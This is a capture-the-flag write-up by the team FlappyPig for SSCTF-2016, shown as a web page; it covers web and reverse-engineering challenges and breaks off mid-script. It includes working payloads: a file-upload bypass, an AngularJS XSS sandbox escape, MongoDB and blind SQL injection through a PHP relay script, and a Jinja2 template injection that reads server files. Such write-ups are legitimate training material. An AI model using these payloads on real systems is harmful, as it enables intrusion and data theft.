<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>FlappyPig SSCTF-2016 Writeup - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="FlappyPig SSCTF-2016 Writeup"/>
    
        <meta name="description" content="FlappyPig SSCTF-2016 Writeup"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>FlappyPig SSCTF-2016 Writeup</h2>
                <div class="article-msg">
                    <span class="time">2016-02-29 19:55:23</span>
                                        <span class="read">阅读：40546次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_2768"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="2768" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 360安全播报</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><img src="http://p1.qhimg.com/t010a3904a1023b9ac9.jpg" title="t010a3904a1023b9ac9.jpg" alt="http://p1.qhimg.com/t010a3904a1023b9ac9.jpg"/></span></strong></span></p><p><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">FlappyPig SSCTF-2016 Writeup</span></strong></span></p><p><span style="color: rgb(0, 112, 192);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Web</span></strong></span></p><p><span style="color: rgb(0, 112, 192);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">100&nbsp; Up!Up!Up!</span></strong></span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这道题比较坑啊… 后来还看chu总在微博上吐槽：上传过滤还能这么写啊..</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">其实这道题是从逐浪CMS一个漏洞演化来的，翻了好久的乌云.. 最终找到了</span></p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0125982" style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://www.wooyun.org/bugs/wooyun-2015-0125982</span></a></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">只要将multipart/form-data的大小写改下就可以上传php文件了</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01748ee329412de3f9.png" title="t016ae1e5f9364564e1.png" alt="http://p8.qhimg.com/t016ae1e5f9364564e1.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Flag：SSCTF{d750aa9eb742bde8c65bc525f596623a}</span></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);"><br/></span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">200&nbsp; Can You Hit Me？</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">队友说这是Augularjs.. 然后去补习了下 </span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">google发现了一遍博文，里面带有一些payload</span></p><p><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</span></a></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">通过文章里提供的payload构造自己的payload</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">xss={{%27a%27.coonnstructor.prototype.charAt=[].join;$evevalal(%22m=1)%20}%20};alalertert(123)//%22};}}</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01577c2cba95d36866.png" title="t01be25a9b2d46acf88.png" alt="http://p7.qhimg.com/t01be25a9b2d46acf88.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">成功弹窗，最好把payload发给主办方就可以得到Flag</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">SSCTF{4c138226180306f21ceb7e7ed1158f08}</span></p><p><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span></strong></span></p><p><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">300&nbsp; Legend？Legend！</span></strong></span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这道题通过尝试注入报错判断是SQL注入，但是用尽了姿势都没有搞定，于是猜想是不是什么高逼格的数据库..&nbsp; 果然，是一个MongoDB</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://drops.wooyun.org/tips/3939</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">根据文章构造payload，读取user表中的第一条。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01be290c2f2b22b46b.png" title="t01f5e482c39cf037cb.png" alt="http://p5.qhimg.com/t01f5e482c39cf037cb.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">尝试提交MD5..不对&nbsp; 然后登陆邮箱 发现了一个假的flag..</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01c5d0c902b3cd333f.png" title="t01032aef3467fb1fbe.png" alt="http://p6.qhimg.com/t01032aef3467fb1fbe.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">还有神奇的xss</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01ebdd92e542b6f467.png" title="t01c9c881d852812e5d.png" alt="http://p9.qhimg.com/t01c9c881d852812e5d.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">最后终于找到了正确的flag</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01d139ad1428ce6c4c.png" title="t01addf9e95fcce8980.png" alt="http://p3.qhimg.com/t01addf9e95fcce8980.png"/></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);"><br/></span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">400&nbsp; Flag-Man</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">登录github授权，然后发现在Your Profile中的Name是控制/users中的name</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Name是可控制的,遍历目录 最后读取文件 得到flag</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">参见</span><a href="https://mail.qq.com/cgi-bin/mail_spam?action=check_link&spam=0&spam_src=1&mailid=ZC0429-wnFNyJpt0_YlZ2g~GkPKD62&url=http%3A%2F%2Fdrops%2Ewooyun%2Eorg%2Fweb%2F13057" style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://drops.wooyun.org/web/13057</span></a></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">payload:</span></p><pre class="brush:python;toolbar:false">{%for&nbsp;c&nbsp;in&nbsp;[].__class__.__base__.__subclasses__()%}{%if&nbsp;c.__name__&nbsp;==&nbsp;&#39;catch_warnings&#39;%}{{c.__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;__builtins__&#39;].open(&#39;ssctf.py&#39;).read()}}{%endif%}{%endfor%}</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01b88887d008706a3b.png" title="t01a813ffb382ef0217.png" alt="http://p6.qhimg.com/t01a813ffb382ef0217.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">更改完之后 访问user目录 得到flag</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01f880ceebd665defb.png" title="t016f01b06a2b1f3e98.png" alt="http://p2.qhimg.com/t016f01b06a2b1f3e98.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">500&nbsp; AFSRC-Market</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这道题一直没思路.. 凌晨一点多的时候突然放了提示</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">（让不让人睡觉了啊！摔）</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;注入在add_cart.php页面，提交id=xxx&nbsp; cost为0 判断有注入，但是不能直接得到数据。于是中转注入 </span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">&nbsp;$opts&nbsp;=&nbsp;array&nbsp;(&#39;http&#39;&nbsp;=&gt;&nbsp;array&nbsp;(&#39;header&#39;=&gt;&#39;Cookie:&nbsp;PHPSESSID=1;&#39;));
$context&nbsp;=&nbsp;stream_context_create($opts);
$html&nbsp;=&nbsp;file_get_contents(&#39;http://edb24e7c.seclover.com/add_cart.php?id=0x&#39;.bin2hex($_GET[x]),&nbsp;false,&nbsp;$context);
$html&nbsp;=&nbsp;file_get_contents(&#39;http://edb24e7c.seclover.com/userinfo.php&#39;,&nbsp;false,&nbsp;$context);
preg_match(&#39;/cost:&nbsp;(.*?)&lt;\/p&gt;/is&#39;,$html,$res);
echo&nbsp;$res[1]==0&nbsp;?&nbsp;0&nbsp;:&nbsp;1;</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">注出来一个提示页面 </span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01dbe607d0452b0aac.png" title="t0196e23abcc8e92973.png" alt="http://p7.qhimg.com/t0196e23abcc8e92973.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">根据提示注自己的token 然后爆破salt 按步骤走最终得到Flag</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">Reverse</span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">100&nbsp; Re1</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这个题一开始想难了。Apk拖入jeb，主类是Seclreg，初始化函数如下，主要是加了两个监听</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01b0c5f5820c77a721.png" title="t014b243409549546a1.png" alt="http://p2.qhimg.com/t014b243409549546a1.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">重点看sign_btn的监听函数，如下这一行做了一个des加密，加密数据为secl-007，注意c后面是l不是1.；密钥是A7B7C7D7E7F70717进行了一些变换，加密结果暂时不管。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t011aa73ba31329fb9b.png" title="t01b288be754db353f9.png" alt="http://p0.qhimg.com/t01b288be754db353f9.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">重点的判断语句在下图的这行，用户名需要是secl-007，密码和上述加密结果传入lib进行进一步判断。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t012ceeb06e619b12a5.png" title="t0156eeec00c3142020.png" alt="http://p0.qhimg.com/t0156eeec00c3142020.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Ida打开libplokm.so，定位到getp函数，本函数第一个参数是加密后的结果，第二个参数是输入的密码。大概浏览了一眼，函数没有对密码做任何修改，定位到最后的比较语句，如下图，发现密码需要有39位。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01e3543cbf84159ca2.png" title="t018bc1b1ed8fbfe59e.png" alt="http://p0.qhimg.com/t018bc1b1ed8fbfe59e.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">此时直接gdb挂上，查看该调用传入的第一个参数就是flag（其实是两遍flag）。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01fd82b93bc0fafd15.png" title="t01412f2a4f5af193b9.png" alt="http://p1.qhimg.com/t01412f2a4f5af193b9.png"/></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);"><br/></span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">200&nbsp; Re2</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这个程序主要是建立了多个线程，所有的变换都是在线程中进行的。由比较的地方一点点往前逆推。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">比较坑的地方如下，8个字节变成1个字节，信息缺失这么多。解应该很多。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01afd570933112244b.png" title="t01e55a628b5ce54b47.png" alt="http://p9.qhimg.com/t01e55a628b5ce54b47.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">写了个脚本算了几组可能的解，刚好flag就在里面。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">def&nbsp;BIN(s):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;&#39;.join([format(ord(x),&#39;08b&#39;)&nbsp;for&nbsp;x&nbsp;in&nbsp;str(s)])
&nbsp;
key&nbsp;=&nbsp;&#39;c678d6g64307gf4g`b263473ge35b5`9&#39;
#a2b3dcab&nbsp;|&nbsp;aabbd4a3&nbsp;|&nbsp;b2a3ccbb&nbsp;|&nbsp;baabc4b3
valuess&nbsp;=&nbsp;[&#39;a2b3dcab&#39;&nbsp;,&nbsp;&#39;aabbd4a3&#39;&nbsp;,&nbsp;&#39;b2a3ccbb&#39;&nbsp;,&nbsp;&#39;baabc4b3&#39;]
for&nbsp;value&nbsp;in&nbsp;valuess:
&nbsp;&nbsp;&nbsp;&nbsp;value&nbsp;=&nbsp;value.decode(&#39;hex&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;s2&nbsp;=&nbsp;BIN(value)
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;s2
&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;=&nbsp;&#39;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(32):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;s2[i]&nbsp;==&nbsp;&#39;1&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;+=&nbsp;chr(ord(key[i])^1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;+=&nbsp;key[i]
&nbsp;
print&nbsp;res</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">300&nbsp; Re3</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">上来逆向发现</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">atoi(input)=2453148193</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">md5(input)=4850B7446BBB20AAD140E7B0A964A57D</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">难道要暴力跑？</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">后来，查看了下资源，发现有两个按钮，修改0x40162d处指令为push 1，运行可以看到。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01f7a914f8387f9301.png" title="t016e258ef2a6bfa7dd.png" alt="http://p3.qhimg.com/t016e258ef2a6bfa7dd.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">具体算法比较简单，写了个代码解了下。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">res&nbsp;=&nbsp;&quot;b5h760h64R867618bBwB48BrW92H4w5r&quot;
ddd&nbsp;=&nbsp;&#39;chmrwbglqvafkpuzejotydinsx&#39;
&nbsp;
dicts&nbsp;=&nbsp;{}
for&nbsp;i&nbsp;in&nbsp;range(26):
&nbsp;&nbsp;&nbsp;&nbsp;dicts[ddd[i]]=(ord(&#39;a&#39;)+i)
&nbsp;&nbsp;&nbsp;&nbsp;#dicts[chr((ord(&#39;a&#39;)+i))]=ord(ddd[i])
&nbsp;
res2&nbsp;=&nbsp;&#39;&#39;
for&nbsp;i&nbsp;in&nbsp;range(32):
&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;ord(res[i])
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(c&nbsp;&gt;=&nbsp;0x30)&amp;(c&lt;=0x39):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res2&nbsp;+=&nbsp;res[i]
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;(c&gt;=ord(&#39;a&#39;))&amp;(c&lt;=ord(&#39;z&#39;)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res2&nbsp;+=&nbsp;chr(dicts[res[i]])
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;(c&gt;=ord(&#39;A&#39;))&amp;(c&lt;=ord(&#39;Z&#39;)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res2&nbsp;+=&nbsp;chr(dicts[chr(ord(res[i])+0x20)]-0x20)
&nbsp;
print&nbsp;res2</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">400&nbsp; Re4</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">求pass1.</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">from&nbsp;zio&nbsp;import&nbsp;*
key&nbsp;=&nbsp;&#39;279568f747011870997268b35c9bde08bf5ef126936d8ae0a0c4052dff&#39;.decode(&#39;hex&#39;)
print&nbsp;HEX(key)
value&nbsp;=&nbsp;&#39;7C&nbsp;CD&nbsp;01&nbsp;97&nbsp;06&nbsp;6F&nbsp;2C&nbsp;29&nbsp;FC&nbsp;31&nbsp;09&nbsp;DC&nbsp;1D&nbsp;F5&nbsp;8F&nbsp;7D&nbsp;DE&nbsp;30&nbsp;B6&nbsp;49&nbsp;FD&nbsp;0A&nbsp;D9&nbsp;89&nbsp;FD&nbsp;9F&nbsp;4D&nbsp;7D&nbsp;A2&nbsp;&#39;.replace(&#39;&nbsp;&#39;,&nbsp;&#39;&#39;).decode(&#39;hex&#39;)
res&nbsp;=&nbsp;&#39;&#39;
&nbsp;
print&nbsp;len(key)
print&nbsp;len(value)
for&nbsp;i&nbsp;in&nbsp;range(len(key)):
